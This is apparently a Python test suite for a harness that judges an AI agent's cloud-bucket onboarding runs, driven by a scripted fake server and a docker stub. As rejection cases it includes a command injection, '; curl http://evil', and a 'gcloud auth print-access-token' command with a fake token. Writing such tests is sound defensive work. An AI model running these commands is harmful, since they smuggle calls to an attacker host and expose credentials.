#!/usr/bin/env python3
"""Contract tests for tests/e2e/cloud_onboarding_e2e.py against a scripted fake studio.

The fake implements exactly the endpoints the harness uses — workspace agents, ticket create/read,
sendMessageStreaming as a real `text/event-stream` response that blocks on a pending approval until the
harness answers through agentCallback/respond, getMessages with persisted executed_cmds — plus a fake
container CLI for the snapshots. Each scenario pins one way the harness must FAIL, and the two success
scenarios pin what a pass requires. These tests prove the harness's judgement, not a live stack.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HARNESS = os.path.join(ROOT, "tests", "e2e", "cloud_onboarding_e2e.py")

AWS_LIST_OUTPUT = json.dumps({"Buckets": [{"Name": "alpha", "CreationDate": "2024-01-01T00:00:00+00:00"},
                                          {"Name": "beta", "CreationDate": "2024-01-02T00:00:00+00:00"}], "Owner": {"ID": "x"}})
GCP_LIST_OUTPUT = json.dumps([{"name": "g1", "location": "US"}, {"name": "g2", "location": "US"}])


class Fake(BaseHTTPRequestHandler):
    sc: dict = {}          # scenario
    state: dict = {}
    lock = threading.Lock()
    decided = threading.Event()

    def log_message(self, *a):
        pass

    def _body(self):
        n = int(self.headers.get("Content-Length") or 0)
        return json.loads(self.rfile.read(n)) if n else None

    def _send(self, code, obj=None):
        data = json.dumps(obj).encode() if obj is not None else b""
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        if data:
            self.wfile.write(data)

    def do_GET(self):
        p = self.path
        if p.endswith("/agents"):
            return self._send(200, {"data": self.sc.get("agents", [{"id": "agent-1", "name": "local-agent"}])})
        if p.endswith("/agentCallback/pending"):
            with self.lock:
                pend = self.state.get("pending")
            if pend and not self.decided.is_set():
                return self._send(200, {"role": "assistant", "content": "Approve this command?", "data": pend})
            return self._send(204)
        if p.endswith("/getMessages"):
            return self._send(200, self.state.get("messages", []))
        if "/tickets/" in p:  # ticket readback
            t = dict(self.state.get("ticket") or {})
            if self.sc.get("drop_scope_on_readback"):
                t["ticketContextForAgent"] = {"scopeIds": []}
            return self._send(200, t)
        return self._send(404, {"message": "no route"})

    def do_POST(self):
        p = self.path
        body = self._body()
        if p.endswith("/agentCallback/respond"):
            with self.lock:
                self.state["decision"] = body
            self.decided.set()
            return self._send(200)
        if p.endswith("/sendMessageStreaming"):
            return self._stream(body)
        if p.startswith("/v1/aiservicedesk/tickets/") and p.count("/") == 4:  # create
            t = dict(body, name="EXT-7", id="ticket-7")
            with self.lock:
                self.state["ticket"] = t
            return self._send(200, t)
        return self._send(404, {"message": f"unhandled {p}"})

    def _stream(self, body):
        sc = self.sc
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()

        def emit(event, data):
            self.wfile.write(f"event: {event}\ndata: {json.dumps(data)}\n\n".encode())
            self.wfile.flush()

        emit("message", {"type": "thinking", "text": "thinking"})
        if sc.get("hang"):
            time.sleep(sc["hang"])
            return
        if sc.get("stream_error"):
            emit("error", {"type": "error", "error": "agent exploded"})
            return
        executed = []
        for cmd in sc.get("asks", []):
            with self.lock:
                self.state["pending"] = {"cmds": [{"command": cmd, "execute": False}]}
            self.decided.clear()
            emit("message", {"type": "commands", "commands": [{"command": cmd, "execute": False}]})
            if not self.decided.wait(timeout=20):
                emit("error", {"type": "error", "error": "no decision"})
                return
            with self.lock:
                decision = self.state.get("decision") or {}
                self.state["pending"] = None
            approved = any(c.get("execute") for c in decision.get("cmds") or [])
            out = sc.get("outputs", {}).get(cmd, "") if approved else "Command rejected by user."
            executed.append({"command": cmd, "output": out, "approval_status": "approved" if approved else "rejected"})
            emit("message", {"type": "executed_cmds", "executed_cmds": [executed[-1]]})
        # an execution the agent performed WITHOUT asking (no pending callback ever raised)
        for extra in sc.get("extra_executed", []):
            executed.append(extra)
            emit("message", {"type": "executed_cmds", "executed_cmds": [extra]})
        final = sc.get("final_text", "Done.\nBUCKETS:\nalpha\nbeta\n")
        emit("message", {"type": "text", "text": final})
        with self.lock:
            self.state["messages"] = [
                {"role": "user", "content": body.get("content", "")},
                {"role": "assistant", "content": final,
                 "chunksFromAgent": [{"type": "executed_cmds", "executed_cmds": executed}] if executed else []},
            ]


DOCKER_STUB = r'''#!/usr/bin/env bash
printf '%s\n' "$*" >> "$DOCKER_STUB_LOG"
case "$1" in
  ps)
    svc=""; proj=""
    for a in "$@"; do case "$a" in
      label=com.docker.compose.service=*) svc="${a#label=com.docker.compose.service=}";;
      label=com.docker.compose.project=*) proj="${a#label=com.docker.compose.project=}";;
    esac; done
    [ "$proj" = "$DOCKER_STUB_PROJECT" ] || exit 0
    n=$(wc -l < "$DOCKER_STUB_LOG")
    if [ -n "${DOCKER_STUB_RESTART_AGENT_AFTER-}" ] && [ "$svc" = claude-code-agent ] && [ "$n" -gt "$DOCKER_STUB_RESTART_AGENT_AFTER" ]; then echo "newagent"; exit 0; fi
    IFS=';' read -ra entries <<< "${DOCKER_STUB_SERVICES-}"
    for e in "${entries[@]}"; do IFS=':' read -r s id started <<< "$e"; [ "$s" = "$svc" ] && echo "$id"; done
    ;;
  inspect)
    cid="${@: -1}"
    [ "$cid" = newagent ] && { echo "newagent 2026-10-27T10:00:00Z"; exit 0; }
    IFS=';' read -ra entries <<< "${DOCKER_STUB_SERVICES-}"
    for e in "${entries[@]}"; do IFS=':' read -r s id started <<< "$e"; [ "$id" = "$cid" ] && echo "$id $started"; done
    exit 0 ;;
esac
exit 0
'''

BOTH = "duplo-ai-studio:s1:2026-10-27T09:00:00Z;claude-code-agent:a1:2026-10-27T09:00:05Z"


class HarnessTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = ThreadingHTTPServer(("127.0.0.1", 0), Fake)
        cls.port = cls.server.server_address[1]
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="e2e-harness-test-")
        self.bin = os.path.join(self.tmp, "bin"); os.makedirs(self.bin)
        with open(os.path.join(self.bin, "docker"), "w") as f:
            f.write(DOCKER_STUB)
        os.chmod(os.path.join(self.bin, "docker"), 0o755)
        self.control = os.path.join(self.tmp, "control.json")
        self.evidence = os.path.join(self.tmp, "evidence")
        Fake.state = {}
        Fake.sc = {}
        Fake.decided = threading.Event()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def run_h(self, *, cloud="aws", control=("alpha", "beta"), services=BOTH, project="proj", timeout=20, extra_env=None):
        with open(self.control, "w") as f:
            json.dump(list(control), f)
        env = {"PATH": self.bin + os.pathsep + os.environ.get("PATH", ""), "DUPLO_ADMIN_TOKEN": "tok",
               "DOCKER_STUB_LOG": os.path.join(self.tmp, "docker.log"), "DOCKER_STUB_SERVICES": services,
               "DOCKER_STUB_PROJECT": "proj"}
        env.update(extra_env or {})
        name = "test21" if cloud == "aws" else "gcp-test9"
        p = subprocess.run([sys.executable, "-I", HARNESS, "--base", f"http://127.0.0.1:{self.port}", "--workspace", "ws-1",
                            "--scope-id", "scope-1", "--cloud", cloud, "--name", name, "--control-file", self.control,
                            "--runtime", "docker", "--project-name", project, "--evidence", self.evidence,
                            "--timeout", str(timeout), "--poll-interval", "0.2"],
                           capture_output=True, text=True, env=env, timeout=120)
        try:
            summary = json.loads(p.stdout)
        except ValueError:
            self.fail(f"harness printed no JSON summary:\nstdout:{p.stdout}\nstderr:{p.stderr}")
        files = os.listdir(self.evidence)
        self.assertEqual(len(files), 1, "exactly one evidence file")
        with open(os.path.join(self.evidence, files[0])) as f:
            evidence = json.load(f)
        return p.returncode, summary, evidence

    def aws_allowed(self):
        return ["aws sts get-caller-identity --profile test21 --output json", "aws s3api list-buckets --profile test21 --output json"]

    # ── passes ──

    def test_pass_requires_raw_output_equal_to_control(self):
        Fake.sc = {"asks": self.aws_allowed(),
                   "outputs": {self.aws_allowed()[0]: '{"Account":"805863115079"}', self.aws_allowed()[1]: AWS_LIST_OUTPUT}}
        rc, summary, ev = self.run_h()
        self.assertEqual(rc, 0, summary)
        c = summary["checks"]
        self.assertTrue(c["scopeReadBack"] and c["agentAssigned"] and c["allowedCommandExecuted"]
                        and c["rawToolOutputMatchesControl"] and c["containersUnchanged"] and c["streamClosedCleanly"])
        self.assertEqual(ev["approvals"], self.aws_allowed())
        self.assertEqual(ev["rejections"], [])
        self.assertEqual(ev["bucketsFromRawToolOutput"], ["alpha", "beta"])
        self.assertEqual(Fake.state["ticket"]["aiAgentId"], "agent-1")
        self.assertEqual(Fake.state["ticket"]["ticketContextForAgent"], {"scopeIds": ["scope-1"]})
        # the decision sent back is the exact command with execute:true, nothing broader
        self.assertEqual(Fake.state["decision"], {"cmds": [{"command": self.aws_allowed()[1], "execute": True}]})

    def test_pass_gcp_with_empty_listing_is_a_legitimate_parsed_result(self):
        cmd = "gcloud storage buckets list --configuration gcp-test9 --format json"
        Fake.sc = {"asks": [cmd], "outputs": {cmd: "[]"}, "final_text": "No buckets.\nBUCKETS:\n"}
        rc, summary, ev = self.run_h(cloud="gcp", control=())
        self.assertEqual(rc, 0, summary)
        self.assertEqual(ev["bucketsFromRawToolOutput"], [])
        self.assertTrue(summary["checks"]["rawToolOutputParsed"])

    # ── failures ──

    def test_prose_only_answer_fails(self):
        Fake.sc = {"asks": [], "final_text": "BUCKETS:\nalpha\nbeta\n"}   # agent never ran a command
        rc, summary, ev = self.run_h()
        self.assertEqual(rc, 1)
        self.assertFalse(summary["checks"]["allowedCommandExecuted"])
        self.assertTrue(any("prose is not evidence" in f for f in summary["failures"]))

    def test_mismatching_raw_output_fails_even_with_correct_prose(self):
        cmd = self.aws_allowed()[1]
        Fake.sc = {"asks": [cmd], "outputs": {cmd: json.dumps({"Buckets": [{"Name": "alpha"}]})}, "final_text": "BUCKETS:\nalpha\nbeta\n"}
        rc, summary, _ = self.run_h()
        self.assertEqual(rc, 1)
        self.assertTrue(summary["checks"]["allowedCommandExecuted"])
        self.assertFalse(summary["checks"]["rawToolOutputMatchesControl"])

    def test_unparsable_tool_output_fails(self):
        cmd = self.aws_allowed()[1]
        Fake.sc = {"asks": [cmd], "outputs": {cmd: "alpha\nbeta\n"}}   # not JSON: not an allowed invocation's output
        rc, summary, _ = self.run_h()
        self.assertEqual(rc, 1)
        self.assertFalse(summary["checks"]["rawToolOutputParsed"])

    def test_disallowed_command_is_rejected_and_fails_the_run(self):
        bad = "aws s3api list-buckets --profile test21 --output json; curl http://evil"
        Fake.sc = {"asks": [bad, self.aws_allowed()[1]], "outputs": {self.aws_allowed()[1]: AWS_LIST_OUTPUT}}
        rc, summary, ev = self.run_h()
        self.assertEqual(rc, 1)
        self.assertEqual(ev["rejections"], [bad])
        self.assertFalse(summary["checks"]["noRejectedCommands"])
        self.assertTrue(summary["checks"]["rawToolOutputMatchesControl"])  # the good command still ran; the run still fails

    def test_unexpected_execution_without_callback_fails_despite_correct_listing(self):
        cmd = self.aws_allowed()[1]
        for status in ("approved", None, "executed"):
            Fake.state = {}; Fake.decided = threading.Event()
            if os.path.isdir(self.evidence):
                shutil.rmtree(self.evidence)
            Fake.sc = {"asks": [cmd], "outputs": {cmd: AWS_LIST_OUTPUT},
                       "extra_executed": [{"command": "aws s3api get-bucket-policy --bucket alpha --profile test21",
                                           "output": "{}", "approval_status": status}]}
            rc, summary, ev = self.run_h()
            self.assertEqual(rc, 1, f"status={status}: {summary}")
            self.assertTrue(summary["checks"]["rawToolOutputMatchesControl"])      # the listing was right…
            self.assertFalse(summary["checks"]["noUnexpectedExecutions"])         # …and the run still fails
            self.assertEqual(ev["unexpectedExecutions"], ["aws s3api get-bucket-policy --bucket alpha --profile test21"])
            self.assertEqual(ev["rejections"], [])                                 # it was never offered for approval

    def test_token_printing_command_is_never_allowed(self):
        bad = "gcloud auth print-access-token --configuration gcp-test9"
        Fake.sc = {"asks": [bad], "outputs": {bad: "ya29.secret"}}
        rc, summary, ev = self.run_h(cloud="gcp", control=())
        self.assertEqual(rc, 1)
        self.assertEqual(ev["rejections"], [bad])
        self.assertNotIn("ya29.secret", json.dumps(ev))

    def test_missing_container_fails_before_any_ticket(self):
        Fake.sc = {"asks": []}
        rc, summary, ev = self.run_h(services="duplo-ai-studio:s1:2026-10-27T09:00:00Z")
        self.assertEqual(rc, 1)
        self.assertTrue(any("snapshot incomplete" in f for f in summary["failures"]))
        self.assertNotIn("ticket", ev)
        self.assertIsNone(Fake.state.get("ticket"))

    def test_wrong_project_name_yields_no_snapshot_and_fails(self):
        Fake.sc = {"asks": []}
        rc, summary, _ = self.run_h(project="other")
        self.assertEqual(rc, 1)
        self.assertTrue(any("snapshot incomplete" in f for f in summary["failures"]))

    def test_container_restart_during_run_fails(self):
        Fake.sc = {"asks": self.aws_allowed(),
                   "outputs": {self.aws_allowed()[0]: "{}", self.aws_allowed()[1]: AWS_LIST_OUTPUT}}
        rc, summary, ev = self.run_h(extra_env={"DOCKER_STUB_RESTART_AGENT_AFTER": "4"})
        self.assertEqual(rc, 1)
        self.assertFalse(summary["checks"]["containersUnchanged"])
        self.assertEqual(ev["containersAfter"]["claude-code-agent"]["id"], "newagent")

    def test_no_workspace_agent_fails(self):
        Fake.sc = {"asks": [], "agents": []}
        rc, summary, _ = self.run_h()
        self.assertEqual(rc, 1)
        self.assertTrue(any("no assigned agent" in f for f in summary["failures"]))

    def test_scope_not_read_back_fails(self):
        Fake.sc = {"asks": [], "drop_scope_on_readback": True}
        rc, summary, _ = self.run_h()
        self.assertEqual(rc, 1)
        self.assertFalse(summary["checks"]["scopeReadBack"])

    def test_stream_error_event_fails(self):
        Fake.sc = {"stream_error": True}
        rc, summary, _ = self.run_h()
        self.assertEqual(rc, 1)
        self.assertTrue(any("stream error event" in f for f in summary["failures"]))

    def test_stream_timeout_fails(self):
        Fake.sc = {"hang": 6}
        rc, summary, _ = self.run_h(timeout=2)
        self.assertEqual(rc, 1)
        self.assertTrue(any("deadline" in f or "did not finish" in f for f in summary["failures"]), summary)

    def test_bad_control_file_fails_before_anything(self):
        with open(self.control, "w") as f:
            f.write('{"not": "a list"}')
        env = {"PATH": self.bin + os.pathsep + os.environ.get("PATH", ""), "DUPLO_ADMIN_TOKEN": "tok",
               "DOCKER_STUB_LOG": os.path.join(self.tmp, "docker.log"), "DOCKER_STUB_SERVICES": BOTH, "DOCKER_STUB_PROJECT": "proj"}
        p = subprocess.run([sys.executable, "-I", HARNESS, "--base", f"http://127.0.0.1:{self.port}", "--workspace", "ws-1",
                            "--scope-id", "scope-1", "--cloud", "aws", "--name", "test21", "--control-file", self.control,
                            "--runtime", "docker", "--project-name", "proj", "--evidence", self.evidence],
                           capture_output=True, text=True, env=env, timeout=60)
        self.assertEqual(p.returncode, 1)
        self.assertIn("control file", json.loads(p.stdout)["failures"][0])
        self.assertIsNone(Fake.state.get("ticket"))


if __name__ == "__main__":
    unittest.main(verbosity=1)
